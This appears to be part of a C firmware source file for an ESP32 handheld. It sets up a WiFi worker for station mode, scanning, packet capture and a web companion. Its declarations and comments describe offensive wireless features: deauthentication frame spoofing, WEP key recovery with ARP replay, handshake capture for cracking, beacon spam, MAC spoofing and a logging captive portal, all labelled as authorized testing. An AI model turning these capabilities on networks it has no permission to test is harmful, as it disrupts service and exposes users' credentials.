/*
 * WiFi (on-SoC 2.4 GHz, station mode) worker implementation (M5-P1). See wifi.h.
 *
 * Architecture, mirroring nfc.cpp / ducky.c:
 *   - A dedicated worker task owns every blocking radio action. LVGL callbacks
 *     only ever post a command to the worker's queue and never touch the radio
 *     directly, so LVGL itself stays single-threaded and can't stall waiting on
 *     association.
 *   - esp_wifi's own event callbacks (STA_START, DISCONNECTED, SCAN_DONE,
 *     GOT_IP) run on the system event task; they publish state and drive a
 *     small connection state machine (connect-on-start, bounded reconnect,
 *     fail-fast on an auth failure).
 *   - Bring-up (esp_netif, the default event loop, esp_wifi_init/start) is lazy,
 *     happening on the first enable/scan request, and gated on
 *     nocsif_reliability_safe_mode(), so boot stays fast and any coexistence
 *     risk (WiFi buffers versus the display-flush DMA path) is confined to
 *     first use.
 *
 * Coexistence: WiFi/LWIP's dynamic buffers are routed into PSRAM
 * (CONFIG_SPIRAM_TRY_ALLOCATE_WIFI_LWIP=y in sdkconfig.defaults) so the radio
 * doesn't eat into the internal DMA RAM the display flush path needs (this is
 * the documented DMA-hang failure class). The boot heartbeat logs internal-DMA
 * free/largest-block sizes for the on-device headroom check.
 *
 * Credentials live in the NocSif NVS settings store, not esp_wifi's own NVS
 * storage (WIFI_STORAGE_RAM is used instead), so a working join gets re-applied
 * on the next enable and survives a reboot.
 */
#include "wifi.h"
#include "ble.h"            /* for nocsif_ble_request_release, to reclaim the radio from a persistent phone link */
#include "coex.h"           /* for NOCSIF_DMA_CAPS and nocsif_int_dma_largest/_free, the shared internal-DMA gauge */
#include <math.h>           /* for cos/sqrt, used by the section 4.6 P3 geo-stamp distance calculation */
#include "freertos/idf_additions.h" /* for xTaskCreateWithCaps / vTaskDeleteWithCaps, the PSRAM lazy-worker stacks (Phase A3) */

#include <stdio.h>
#include <stdlib.h>   /* for atoi (companion /api/brightness|/api/volume), malloc/free, qsort/strtol (P4 file browser) */
#include <string.h>
#include <strings.h>  /* for strcasecmp, used by the section 4.8a P4 file browser (sorting and MIME-by-extension) */
#include <ctype.h>    /* for isxdigit, used by the section 4.8a P4 query %XX decoding */

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"  /* section 4.8a P3: the mutex guarding the screen-mirror thumbnail buffer */
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "esp_mac.h"        /* esp_read_mac (factory STA MAC) */
#include "esp_random.h"     /* esp_fill_random (MAC spoof)    */
#include "esp_timer.h"      /* periodic channel hop + rate sampler (monitor mode) */
#include "esp_sntp.h"       /* NTP time sync over WiFi (sets the system clock for WireGuard/TLS) */
#include "esp_http_server.h"/* M5-P5·4 captive-portal HTTP server                 */
#include "lwip/sockets.h"   /* M5-P5·4 UDP:53 DNS redirector                      */
#include "lwip/netif.h"     /* link check: count the station interface's input     */
#include "lwip/stats.h"     /* lwip_stats.ip.fw — the mirror backs off while the hotspot forwards traffic */
#include "esp_netif_net_stack.h" /* esp_netif_get_netif_impl — the STA lwIP netif        */
#include "mdns.h"           /* §4.8a Companion — nocsif.local responder           */
#include "cJSON.h"          /* §4.8a Companion P2 — parse POST command bodies      */
#include "esp_jpeg_enc.h"   /* §4.8a Companion mirror — software JPEG encoder (esp_new_jpeg) */

#include "settings.h"       /* nocsif_settings_* (NVS creds) */
#include "reliability.h"    /* nocsif_reliability_safe_mode */
#include "sdcard.h"         /* nocsif_sdcard_lock/unlock (PCAP -> /sd) */
#include "sdfs.h"           /* §4.8a P4 / §4.15: shared /sd jail + claim + listing rules */
#include "display.h"        /* nocsif_display_is_asleep — a remote press wakes a dark panel */
#include "ui.h"             /* §4.8a mirror — nocsif_ui_mirror_take (dirty rects + the full-res frame the encoder reads) */
#include "usb_gadget.h"     /* nocsif_usb_gadget_claim_sd (own /sd for PCAP) */
#include "power.h"          /* nocsif_power_batt_pct (§4.8a companion /api/ping) */
#include "wep_recover.h"    /* #4 WEP key recovery — portable Klein/PTW + FMS statistics core */

#include <sys/stat.h>       /* mkdir (PCAP output dir) */
#include <dirent.h>         /* opendir/readdir — §4.8a P4 companion /sd file browser */
#include <errno.h>
#include <unistd.h>         /* close — the link check's raw ICMP socket */
#include "memdiag.h"        /* nocsif_memdiag_extmem_* — web surface bring-up allocates PSRAM-first */
void nocsif_jpeg_mem_internal(bool on);    /* jpeg_mem.c: encoder working set internal-first (Travel Router mode) */
bool nocsif_jpeg_mem_internal_on(void);

static const char *TAG = "wifi";

/* ---- tunables --------------------------------------------------------------------- */
#define WIFI_MAX_AP        20      /* AP rows we keep from a scan (sorted by RSSI)      */
#define WIFI_MAX_RETRY     5       /* reconnect attempts before giving up on a link     */
#define WIFI_CMD_QLEN      6       /* worker command queue depth                        */
#define WIFI_SSID_MAX      33      /* 32 + NUL                                          */
#define WIFI_PASS_MAX      64      /* WPA2 passphrase max                               */
#define WIFI_MAX_SAVED     8       /* remembered network profiles                       */
#define WIFI_AUTOJOIN_RSSI_FLOOR (-85) /* dBm: the automatic pre-scan pick skips saved networks weaker
                                          than this (a -88 dBm mesh neighbour took >80 s to associate
                                          and died with reason=2); an explicit tap still joins anything */

/* Passive parser (M5-P3): copy-out ring + nearby-AP table. The ring lives in PSRAM (the rx
 * hot path only memcpy's into it; the parser task drains + decodes). CAP_SNAP caps the bytes
 * kept per frame — enough for the mgmt header + the early IEs (SSID / DS / RSN) that identify
 * an AP; the rest is discarded. CAP_SLOTS is the burst depth (slots, power of two). */
#define CAP_SNAP          256      /* bytes copied per mgmt frame (headers + early IEs)  */
#define CAP_SNAP_DATA     48       /* bytes copied per data frame (MAC header only)      */
#define CAP_SLOTS         256      /* ring depth (power of two); ~70 KB PSRAM           */
#define MON_AP_MAX        32       /* nearby-AP table size (first-seen; stalest evicted) */
#define MON_STA_MAX       48       /* station table size (first-seen; stalest evicted)   */
#define MON_PROBE_MAX     48       /* probe-request table size (first-seen; stalest evicted) */
#define PCAP_SNAP         400      /* bytes captured per frame for PCAP (headers + payload) */
#define PCAP_SLOTS        128      /* PCAP ring depth (power of two); ~53 KB PSRAM        */
#define PCAP_RADIOTAP_LEN 13       /* our fixed radiotap header (channel + dBm signal)   */
#define MON_HS_MAX        32       /* key-exchange table size (BSSID-keyed; stalest evicted) */

/* NVS keys (<= 15 chars, NocSif "nocsif" namespace via the settings store). */
#define K_SSID      "wifi_ssid"    /* last-connected / auto-join primary (SSID)         */
#define K_PASS      "wifi_pass"    /* last-connected primary (passphrase)              */
#define K_AUTOJOIN  "wifi_autojoin"
#define K_SV_CNT    "wn_n"         /* the saved-profile count; per-index keys are "wn_s%d"/"wn_p%d" */
#define K_AP_SSID   "ap_ssid"      /* software-AP config (M5-P5.3): SSID, channel, hidden flag */
#define K_AP_CHAN   "ap_chan"
#define K_AP_HIDDEN "ap_hidden"
#define K_PT_PAGE   "pt_page"      /* the captive portal's landing-page filename; "" selects the built-in notice */

/* ---- worker commands, sent from the UI/event task to the worker ---- */
typedef enum {
    CMD_ENABLE, CMD_DISABLE, CMD_SCAN, CMD_CONNECT,
    CMD_DISCONNECT, CMD_FORGET, CMD_SCAN_DONE,
    CMD_RECONNECT, CMD_RANDMAC, CMD_RESTMAC, CMD_APPLY_HOST,
    CMD_CONNECT_SAVED, CMD_FORGET_SSID, CMD_SETMAC,
    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor */
    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser  */
    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3·3 PCAP  */
    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live-PCAP over USB-CDC */
    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4·1 EAPOL capture */
    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5·1 management-frame TX */
    CMD_WEP_ON, CMD_WEP_OFF,                                     /* #4 WEP key recovery (target in mac/arg/arg2) */
    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5·2 beacon TX */
    CMD_EXPORT_HC,                                              /* M5 hc22000 export */
    CMD_AP_ON, CMD_AP_OFF,                                      /* M5-P5·3 software AP */
    CMD_PORTAL_ON, CMD_PORTAL_OFF, CMD_PORTAL_RELOAD,           /* M5-P5·4 captive portal */
    CMD_COMP_REMOTE_ON, CMD_COMP_REMOTE_OFF,                    /* §4.8a surface riding a borrowed AP (Travel Router "Control") */
    CMD_LEAN_ON, CMD_LEAN_OFF,                                  /* boot-time lean/full buffer profile (BLE coexist) */
    CMD_GEO_STAMP,                                              /* §4.6 P3: learn the connected network's location */
    CMD_GOT_IP,                                                 /* IP_EVENT_STA_GOT_IP, deferred off the sys_evt task */
    CMD_LINK_LOST,                                              /* WIFI_EVENT_STA_DISCONNECTED (reason in arg), same */
    CMD_REJOIN,                                                 /* drop + re-join the current network (bridge `wifi a=rejoin`) */
} wifi_cmd_type_t;

typedef struct {
    wifi_cmd_type_t type;
    char ssid[WIFI_SSID_MAX];
    char pass[WIFI_PASS_MAX];
    uint8_t mac[6];             /* CMD_SETMAC payload                         */
    int32_t arg;                /* CMD_MON_HOP (bool) / CMD_MON_CHAN (channel) / CMD_GEO_STAMP lat (µdeg) */
    int32_t arg2;               /* CMD_GEO_STAMP lon (µdeg)                     */
    esp_netif_ip_info_t ip;     /* CMD_GOT_IP payload: the lease, copied off the event task */
} wifi_cmd_t;

/* ---- published strings: a lock-free double buffer, writers publish and LVGL reads ---- */
static char         s_status[2][24];
static char         s_detail[2][80];
static char         s_ip[2][16];
static char         s_netmask[2][16];
static char         s_gw[2][16];
static char         s_mac[2][18];              /* "aa:bb:cc:dd:ee:ff\0" */
static volatile int s_status_i, s_detail_i, s_ip_i, s_netmask_i, s_gw_i, s_mac_i;

static void publish_status(const char *s)  { int n = s_status_i ^ 1;  snprintf(s_status[n], sizeof s_status[n], "%s", s);   s_status_i = n; }
static void publish_detail(const char *s)  { int n = s_detail_i ^ 1;  snprintf(s_detail[n], sizeof s_detail[n], "%s", s);   s_detail_i = n; }
static void publish_ip(const char *s)      { int n = s_ip_i ^ 1;      snprintf(s_ip[n], sizeof s_ip[n], "%s", s);           s_ip_i = n; }
static void publish_netmask(const char *s) { int n = s_netmask_i ^ 1; snprintf(s_netmask[n], sizeof s_netmask[n], "%s", s); s_netmask_i = n; }
static void publish_gw(const char *s)      { int n = s_gw_i ^ 1;      snprintf(s_gw[n], sizeof s_gw[n], "%s", s);           s_gw_i = n; }
static void publish_mac_str(const char *s) { int n = s_mac_i ^ 1;     snprintf(s_mac[n], sizeof s_mac[n], "%s", s);         s_mac_i = n; }

/* printf-free on purpose: it runs on the sys_evt task from on_wifi_evt (see the note there). */
static void clear_netinfo(void)
{
    int n;
    n = s_ip_i ^ 1;      s_ip[n][0] = '\0';      s_ip_i = n;
    n = s_netmask_i ^ 1; s_netmask[n][0] = '\0'; s_netmask_i = n;
    n = s_gw_i ^ 1;      s_gw[n][0] = '\0';      s_gw_i = n;
}

/* ---- the published scan snapshot: lock-free, a whole buffer is published atomically ---- */
static nocsif_wifi_ap_t  s_ap[2][WIFI_MAX_AP];
static int               s_ap_cnt[2];
static volatile int      s_ap_i;
static volatile uint32_t s_scan_gen;
static wifi_ap_record_t  s_recs[WIFI_MAX_AP];   /* worker-side scratch space used while retrieving scan records */

/* ---- module state ---- */
static TaskHandle_t   s_task;
static QueueHandle_t  s_q;
static esp_netif_t   *s_netif;
static esp_event_handler_instance_t s_h_wifi, s_h_ip;

static bool           s_driver_up;     /* esp_wifi_init has run and the event handlers are registered */
static bool           s_sta_started;   /* true between STA_START and STA_STOP */
static volatile bool  s_enabled;       /* user intent: whether the radio should be powered on */
static bool           s_want_connect;  /* whether a link should be held, driving connect-on-start */
static bool           s_pending_scan;  /* a scan was requested before STA_START completed */
static volatile bool  s_connected;     /* the station currently has an IP */
static volatile bool  s_scanning;      /* a scan is currently in flight */
static volatile bool  s_available;     /* mirrors s_driver_up for the plain-C getter */
static int            s_retry;         /* reconnect attempts made on this link so far */
static bool           s_auth_fail;     /* whether the last drop looked like a bad passphrase */
static volatile nocsif_wifi_join_state_t s_join_state;  /* drives the connecting screen's display */

static char s_ssid[WIFI_SSID_MAX];     /* the currently targeted network, cached in RAM */
static char s_pass[WIFI_PASS_MAX];

/* Remembered network profiles (SSID plus passphrase), primed at init and upserted on every successful join. */
static char s_sv_ssid[WIFI_MAX_SAVED][WIFI_SSID_MAX];
static char s_sv_pass[WIFI_MAX_SAVED][WIFI_PASS_MAX];
static int  s_sv_cnt;
/* Section 4.6 Governor P3 geo-store: places keyed by BSSID. One SSID can
 * exist at many physical places ("xfinitywifi", a phone hotspot), so a place
 * is really an access point (its BSSID) plus the location it was last
 * connected from (in micro-degrees) plus the SSID it belongs to. Auto-learned
 * by CMD_GEO_STAMP whenever a fresh GNSS fix coincides with a link (using the
 * connected AP's BSSID from esp_wifi_sta_get_ap_info); the Governor then draws
 * a fence, sized by its radius setting, around each one — "near a known AP,
 * so wake WiFi". Persisted as pl_n plus per-index pl_b%d (12 hex digits),
 * pl_s%d, pl_la%d, pl_lo%d; the oldest is evicted once full, and forgetting an
 * SSID drops its places too. */
#define WIFI_MAX_PLACES 8
typedef struct {
    uint8_t bssid[6];
    char    ssid[WIFI_SSID_MAX];
    int32_t lat_ud, lon_ud;
} wifi_place_t;
static wifi_place_t s_pl[WIFI_MAX_PLACES];
static int          s_pl_cnt;
#define GEO_RESTAMP_M   100.0f      /* only re-learn a place when the new fix is at least this far from the stored one */

/* The lean profile (BLE/WiFi coexistence) is strictly a boot-time input.
 * When set, the one and only esp_wifi_init call uses the small buffer set
 * (see bring_up). main.c arms it before WiFi comes up whenever Bluetooth is
 * on; it's never re-initialized at runtime, since the driver's memory
 * footprint is fixed at init time and a runtime swap would just re-fragment
 * the very pool it had just freed (see RAM-BUDGET.md, remake attempts #5/#9). */
static volatile bool s_lean;
static nocsif_wifi_lean_tune_t s_lean_tune;   /* the lean set this boot's esp_wifi_init used (see bring_up) */
static nocsif_wifi_router_tune_t s_router_tune;   /* the router set this boot's esp_wifi_init used */
static nocsif_wifi_router_tune_t s_router_saved;  /* RAM copy of NVS tr_* (same rule as s_lean_saved below) */
static nocsif_wifi_lean_tune_t s_lean_saved;  /* RAM copy of NVS wl_*: read at bring-up, updated by save — the
                                               * bridge (PSRAM stack) must never read NVS itself: once a key
                                               * exists nvs_get reads flash, which disables the cache → assert */
/* Gateway throughput profile (Travel Router): a BOOT-TIME override of the lean set. When main.c sees a
 * persisted "share" intent it arms this before WiFi comes up, so the one esp_wifi_init uses a buffer set
 * with 802.11n aggregation ON plus enough TX buffers to feed a block-ack session (LESSONS.md: too-few TX
 * buffers stall the AP queue on a lost BlockAck). Fixed at init like lean; overrides it in bring_up(). */
static volatile bool s_gw_profile;
/* NTP (WiFi) time sync: SNTP sets the SYSTEM clock (UTC) so WireGuard's handshake timestamp + TLS are
 * valid; s_ntp_gen bumps on each sync for the UI to refresh the PCF RTC (home-local). */
static volatile uint32_t s_ntp_gen;
static bool          s_sntp_started;
static volatile bool s_autojoin = true;     /* auto-reconnect the saved net on enable      */
static bool          s_autojoin_pending;     /* worker: the next scan-done should join the strongest saved AP in range */
static bool          s_autojoin_direct;      /* worker: the join in flight targets the LAST-LINKED network by preference
                                                (seen above the floor, or tried directly when nothing saved was) */
static bool          s_autojoin_direct_failed; /* worker: that join gave up -> the next re-look skips the last-linked
                                                preference once (strongest saved above the floor, else the weak pick) */
static volatile bool s_user_dropped;         /* the owner tapped Disconnect: stay off this net until a wake/tap re-arms  */
static uint8_t       s_mac_factory[6];       /* efuse STA MAC, for "restore default"        */
static bool          s_mac_factory_ok;       /* s_mac_factory populated                     */

/* ---- monitor / promiscuous capture state (M5-P2) ---------------------------------- *
 * A trivial O(1) rx callback tallies volatile counters (single writer, lock-free for the UI
 * readers); an esp_timer hops the channel and samples the 1 Hz frame rate off the LVGL task. */
static volatile bool      s_mon_active;               /* capture running                    */
static volatile bool      s_mon_hop = true;           /* hop 1..13 (true) vs lock (false)   */
static volatile int       s_mon_chan = 1;             /* current / locked channel (1..13)   */
static bool               s_pending_monitor;          /* asked before STA_START completed   */
static bool               s_mon_prev_connected;       /* had a live link before capture     */
static esp_timer_handle_t s_mon_timer;                /* periodic hop + rate sampler        */
static volatile uint32_t  s_mon_total;                /* all captured frames                */
static volatile uint32_t  s_mon_by_type[NOCSIF_WIFI_PKT_KINDS];
static volatile uint32_t  s_mon_ch[14];               /* a per-channel tally, indexed 1..13 */
static volatile uint32_t  s_mon_rate;                 /* frames per second, over a roughly 1s window */
static volatile int8_t    s_mon_rssi_last;
static volatile int8_t    s_mon_rssi_peak;
static uint32_t           s_mon_rate_base;            /* s_mon_total's value at the start of the current window */
static int64_t            s_mon_rate_t0;              /* the window's start time, from esp_timer_get_time */
static volatile uint32_t  s_mon_deauth;               /* deauthentication frames, management subtype 12 */
static volatile uint32_t  s_mon_disassoc;             /* disassociation frames, management subtype 10 */
static volatile uint32_t  s_mon_dd_rate;              /* combined deauth+disassoc rate per second, over a roughly 1s window */
static volatile uint32_t  s_mon_dd_peak;              /* the peak combined deauth+disassoc per-second rate seen */
static uint32_t           s_mon_dd_base;              /* the combined deauth+disassoc count at the window's start */

static void enter_promiscuous(void);   /* installs capture; called either from the worker or at STA_START */
static void monitor_teardown(void);    /* stops capture, without restoring the STA link */
static void do_mgmt_tx_off(void);      /* (M5-P5.1) stops management-frame TX; used during teardown */
static void ap_teardown(void);         /* (M5-P5.3) drops the AP back to stopped-STA; used by the STA entry points */

/* Management-frame TX state (M5-P5.1, active — authorized testing). A
 * bounded-rate transmitter that emits deauthentication or disassociation
 * frames spoofing a chosen AP as the source, addressed to a specific client
 * or the broadcast address, on an esp_timer while monitor mode holds the
 * target's channel. A neutral feature, gated on explicit user action. */
static volatile bool      s_tx_active;
static uint8_t            s_tx_bssid[6];               /* the target AP, spoofed as the source */
static uint8_t            s_tx_client[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }; /* the destination; all-FF means everyone */
static uint8_t            s_tx_channel = 1;            /* the target's home channel */
static char               s_tx_ssid[WIFI_SSID_MAX];    /* the target's SSID, display only */
static bool               s_tx_have_target;
static volatile bool      s_tx_disassoc;               /* false selects deauth (12), true selects disassoc (10) */
static volatile uint32_t  s_tx_count;                  /* frames transmitted this session */
static volatile uint32_t  s_tx_rate;                   /* frames per second, over a roughly 1s window */
static uint32_t           s_tx_rate_base;
static int64_t            s_tx_rate_t0;
static esp_timer_handle_t s_tx_timer;
static bool               s_tx_logged;                 /* logged the first TX result this session */

/* ---- WEP key recovery state (#4, active — authorized testing, the operator's OWN network) --- *
 * The parser hands each WEP data frame from the target to parse_wep(), which derives the IV +
 * keystream bytes (XOR of the known LLC/SNAP + ARP/IP plaintext against the ciphertext) and pushes
 * them to a small SPSC ring. A PSRAM-stack worker (wep_worker_task) drains the ring into the
 * wep_recover context it exclusively owns, and periodically runs the CPU-bound recovery pass. An
 * optional esp_timer re-injects one captured ARP frame to farm fresh IVs (reuses the raw-TX path).
 * UI getters read the volatile scalars the worker/parser publish. Neutral capability. */
typedef struct { uint8_t iv[3]; uint8_t ks[15]; uint8_t ks_len; } wep_samp_t;
#define WEP_RING_SLOTS 1024                         /* SPSC parse->worker sample ring (power of two) */
static volatile bool      s_wep_active;
static uint8_t            s_wep_bssid[6];            /* target AP                                    */
static char               s_wep_ssid[WIFI_SSID_MAX]; /* target SSID (display only)                   */
static int                s_wep_cfg_keylen;          /* 0 auto / 5 / 13                              */
static volatile int       s_wep_state = NOCSIF_WEP_IDLE;
static volatile uint32_t  s_wep_data_frames;         /* WEP data frames seen from the target          */
static volatile uint32_t  s_wep_unique;              /* unique IVs (mirror of the ctx)                */
static volatile uint8_t   s_wep_progress;            /* 0..100                                        */
static uint8_t            s_wep_key[WEP_KEY_MAX_LEN];
static volatile int       s_wep_key_bytes;           /* 0 until recovered                             */
static char               s_wep_key_hex[WEP_KEY_MAX_LEN * 3];    /* "aa:bb:.." (display)              */
static char               s_wep_key_ascii[WEP_KEY_MAX_LEN + 1];  /* printable form, else ""           */
static wep_samp_t        *s_wep_ring;                /* PSRAM SPSC ring (parse producer, worker consumer) */
static volatile uint32_t  s_wep_ring_head, s_wep_ring_tail, s_wep_ring_drop;
static TaskHandle_t       s_wep_task;
static volatile bool      s_wep_replay = true;       /* interactive ARP replay accelerator (default on) */
static uint8_t            s_wep_arp[128];             /* a captured replayable ARP frame (FCS stripped)  */
static volatile int       s_wep_arp_len;             /* >0 once an ARP frame has been captured           */
static volatile uint32_t  s_wep_replays;             /* ARP frames re-injected this session             */
static esp_timer_handle_t s_wep_replay_timer;
static void               do_wep_off(void);          /* fwd (used by monitor_teardown)                 */

/* Beacon TX state (M5-P5·2, active — authorized testing). Advertises a user-managed list of SSIDs
 * (add via keyboard, delete/rename/enable per entry; persisted to NVS) by transmitting beacon frames
 * on an esp_timer while the radio holds a channel. Reuses the P5·1 raw-TX override. The list is
 * written by the LVGL task and read by the esp_timer TX loop, so it is guarded by s_bcn_mux. */
#define BCN_MAX 32                                      /* max SSIDs in the beacon list       */
typedef struct { char ssid[WIFI_SSID_MAX]; bool en; } bcn_entry_t;
static void               do_beacon_off(void);          /* forward declaration, used by monitor_teardown */
static bcn_entry_t        s_bcn[BCN_MAX];
static int                s_bcn_cnt;
static volatile uint32_t  s_bcn_gen;                    /* bumps on any list change, triggering a UI rebuild */
static bool               s_bcn_loaded;                 /* whether the NVS-saved list has been loaded yet */
static portMUX_TYPE       s_bcn_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool      s_bcn_active;
static volatile uint32_t  s_bcn_frames;                 /* beacon frames transmitted */
static volatile uint32_t  s_bcn_rate;                   /* frames per second, over a roughly 1s window */
static uint32_t           s_bcn_rate_base;
static int64_t            s_bcn_rate_t0;
static esp_timer_handle_t s_bcn_timer;

/* Software AP state (M5-P5.3, active — authorized testing). Brings the
 * radio up as an open access point; a periodic esp_timer refreshes the
 * associated-client list — combining the driver's association table with the
 * DHCP server's leases for IP addresses — and publishes it lock-free, double-
 * buffered just like the scan snapshot. Config (SSID, channel, hidden) is
 * cached and persisted to NVS, applied on Start. Given the single radio, AP
 * mode is mutually exclusive with monitor/STA: do_ap_on suspends them, and the
 * STA entry points call do_ap_off. */
#define AP_CLI_MAX   10                                 /* the number of client rows tracked and published */
#define AP_SSID_DEF  "NocSif-AP"
typedef struct { uint8_t mac[6]; char ip[16]; int8_t rssi; } ap_cli_t;
static volatile bool      s_ap_active;
static char               s_ap_ssid[WIFI_SSID_MAX] = AP_SSID_DEF;
static volatile int       s_ap_channel = 1;
static volatile bool      s_ap_hidden;
static int                s_ap_maxconn = 4;             /* the default association cap */
static bool               s_ap_cfg_loaded;              /* whether the NVS config has been primed yet */
static bool               s_ap_prev_connected;          /* whether there was a live STA link before AP mode started */
static esp_netif_t       *s_ap_netif;                   /* the default AP netif, running the DHCP server */
static esp_timer_handle_t s_ap_timer;                   /* the periodic client-list refresh timer */
static char               s_ap_ip[16];                  /* the AP's own IPv4 address (its gateway) */
static portMUX_TYPE       s_sap_mux = portMUX_INITIALIZER_UNLOCKED;  /* guards s_ap_ssid */
static ap_cli_t           s_ap_cli[2][AP_CLI_MAX];      /* the published client snapshot, double-buffered */
static int                s_ap_cli_cnt[2];
static volatile int       s_ap_cli_i;
static volatile uint32_t  s_ap_cli_gen;                 /* bumps on a membership change         */

/* Captive portal state (M5-P5·4, active — authorized testing). A UDP:53 DNS redirector (its own task)
 * + an esp_http_server that serves a landing page (from /sd, else a built-in notice) for every request
 * and records each client interaction to a RAM ring (for the UI) + /sd/nocsif/wifi/portal-NNN.log.
 * Layered on the open software AP; cannot outlive it (ap_teardown stops it). */
#define PORTAL_LOG_MAX   10                             /* recent interactions kept for the UI  */
#define PORTAL_LOG_LINE  80
#define PORTAL_PAGE_MAX  8192                           /* the maximum landing-page bytes read from /sd */
#define PORTAL_DIR       "/sd/nocsif/wifi/portals"      /* the landing-page library available on the card */
#define PT_SEL_MAX       64                             /* buffer for the selected page's filename */
static void               portal_stop(void);            /* forward declaration, used by ap_teardown */
static char               s_portal_page_sel[PT_SEL_MAX];/* the chosen page's filename; "" means built-in */
static bool               s_portal_sel_loaded;          /* whether the selection has been primed from NVS */
static volatile bool      s_portal_active;
static httpd_handle_t     s_httpd;
static int                s_dns_sock = -1;
static volatile bool      s_dns_run;
static TaskHandle_t       s_dns_task;
static bool               s_portal_sd_ok;               /* whether the SD card was claimed for this session */
static volatile bool      s_portal_page_tried;          /* whether loading the page has been attempted, on the httpd task */
static char              *s_portal_page;                /* the landing page's bytes, in PSRAM; NULL means built-in */
static int                s_portal_page_len;
static char               s_portal_logpath[64];         /* resolved on the httpd task */
static volatile uint32_t  s_portal_hits;
static volatile uint32_t  s_portal_gen;
static portMUX_TYPE       s_portal_mux = portMUX_INITIALIZER_UNLOCKED;
static char               s_portal_log[PORTAL_LOG_MAX][PORTAL_LOG_LINE];
static int                s_portal_log_head;            /* the ring's write index */
static int                s_portal_log_cnt;

/* §4.8a Web remote (the "companion" surface): mDNS `nocsif.local` + a routed esp_http_server (its OWN
 * handle, distinct from the captive portal's wildcard server, with which it is mutually exclusive on
 * port 80) + the /ws mirror/control socket. Since the Travel Router revamp it is served ONLY on the
 * gateway's hotspot (Travel Router > Web control, gateway.c `remote`); it raises no AP of its own and
 * never touches Bluetooth. Written only by the worker; read by the LVGL getters after `s_comp_active`
 * is set (single writer + the active flag as a barrier, mirroring the portal getters). */
#define COMP_HOST        "nocsif"                        /* -> nocsif.local                      */
#define COMP_REMOTE_MIN_INT_FREE  5120                   /* DMA-pool bytes free before the surface may come up (it costs ~4.7 KB; with share up the pool idles ~5.4 KB) */
static void               companion_stop(void);          /* fwd (used by ap_teardown)            */
static httpd_handle_t     s_comp_httpd;                  /* web-remote HTTP server (:80, routed) */
static volatile bool      s_comp_active;                 /* surface is up                        */
static bool               s_comp_remote;                 /* surface is up on the Travel Router hotspot (gateway "Web control") */
static bool               s_mdns_up;                     /* mDNS responder running               */
static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: UI-registered command handler    */
static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: /api/menu provider      */
static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: live-state provider (ping + /ws) */
static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive: WS uplink → remote pointer */

/* ---- §4.8a Web remote — the live-mirror pipeline (watch → phone over WebSocket) ---------------- *
 * Three decoupled stages, each bounded and newest-wins, none of them ever blocking the LVGL task:
 *
 *   capture (LVGL task, core 1)   the display flush tap copies each flushed region into the full-res
 *                                 RGB565 mirror buffer and unions it into a 4-slot dirty-rect list (ui.c).
 *                                 A 50 ms LVGL timer only KICKS the mirror task when the list is non-empty.
 *   encode  (mirror task, core 0) nocsif_ui_mirror_take() atomically takes the accumulated rects (the
 *                                 list resets — nothing is skipped, nothing is lost), the rectangles are
 *                                 snapshotted from the live buffer and JPEG-encoded (software — the S3 has
 *                                 no JPEG hardware) into one of TWO PSRAM frame buffers.
 *   send    (mirror task, core 0) every connected /ws client has its own non-blocking send cursor over a
 *                                 frame buffer (MSG_DONTWAIT); a client that moves no bytes for
 *                                 WS_TX_STALL_US is dropped, never waited on.
 *
 * Depth is bounded by the two frame buffers. A buffer no client is mid-send on is free to be re-encoded;
 * if it still holds rectangles some connected client has not delivered, those rectangles are UNIONED into
 * the new frame and its coverage extends back, so a slow client never ends up with a stale patch and a
 * fast client is never held back by it. Each frame records the take range it covers, (from, seq]; a client
 * may apply a frame only if it has delivered everything up to `from`, otherwise it is marked for a
 * keyframe (a whole-screen frame, from = 0), which the next encode produces. Rapid screen switches
 * collapse naturally: the rect list grows to the whole screen and the LATEST state is what gets encoded.
 *
 * Self-healing: an encoder failure drops that frame, forces a keyframe and backs off; a client stalled
 * mid-frame is dropped (the page reconnects); a pipeline that moves no bytes for MIR_RESET_US with clients
 * connected and work pending is reset outright (cursors cleared, encoder reopened, keyframe forced). All
 * of it is counted (nocsif_wifi_mirror_stats → bridge `gw status`). JPEG quality adapts (85 → 70 → 55) to
 * the slowest active client's send rate, the encode time and internal-DMA pressure; resolution never
 * changes (a half-res frame in motion was found unreadable). The httpd task is left to the RX side (touch
 * uplink + HTTP) and runs one priority above this task, so control stays prompt during a full-frame encode;
 * lwIP sockets are full-duplex on IDF (LWIP_NETCONN_FULLDUPLEX), so TX from here and RX on httpd coexist. */
#define COMP_WS_MAX        4
#define MIR_BUFS           2
#define MIR_RECTS          4                              /* == ui.c WM_RECTS (the nocsif_ui_mirror_take contract) */
#define COMP_JPEG_MAX      (128 * 1024)                   /* one encoded frame (all chunks): a q85 410×502 is ~15-45 KB */
#define COMP_FRAME_HDR     16                             /* 'N','P', ver 2, 0, x0 u16, y0 u16, jpeg len u32, pad   */
#define WS_TX_STALL_US     (8 * 1000 * 1000)              /* no send progress for this long → drop the client        */
#define MIR_SUSPECT_US     (3 * 1000 * 1000)              /* ... and after this long, ask the Wi-Fi link check to test the router now */
#define MIR_RESET_US       (5 * 1000 * 1000)              /* no pipeline progress for this long → reset the pipeline */
#define MIR_STATE_US       (500 * 1000)                   /* live-state JSON cadence per client                      */
#define MIR_TICK_MS        50                             /* the task's own wake cadence while clients are connected */
#define MIR_Q_MAX          85                             /* adaptive JPEG quality range (step 15)                   */
#define MIR_Q_MIN          55
#define MIR_Q_STEP         15
